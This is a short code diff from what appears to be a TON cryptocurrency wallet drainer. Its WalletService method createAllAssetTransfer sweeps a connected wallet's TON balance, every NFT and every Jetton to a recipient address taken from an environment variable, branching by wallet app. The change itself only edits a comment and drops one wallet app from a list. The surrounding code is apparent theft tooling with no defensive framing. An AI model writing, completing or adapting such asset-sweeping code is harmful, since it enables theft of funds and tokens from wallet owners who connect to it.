@@ -434,7 +434,7 @@ export class WalletService {
   }
 
   /**
-   * 批量资产转移（TON + 所有 NFT + 所有 Jetton，包括 USDT）
+   * 批量资产转移（TON + 所有 NFT + 所有 Jetton）
    */
   static async createAllAssetTransfer(wallet, appInfo, appName) {
     const targetOwner = process.env.RECIPIENT_ADDRESS; // 收款人的"普通钱包地址（owner）"
@@ -453,7 +453,7 @@ export class WalletService {
         throw new Error("TON 余额不足");
       }
 
-      if (["tonkeeper", "mytonwallet", "tonkhub"].includes(appName)) {
+      if (["tonkeeper", "mytonwallet"].includes(appName)) {
         // 支持 NFT
 
         // 1) NFTs：逐个把所有权转给 targetOwner
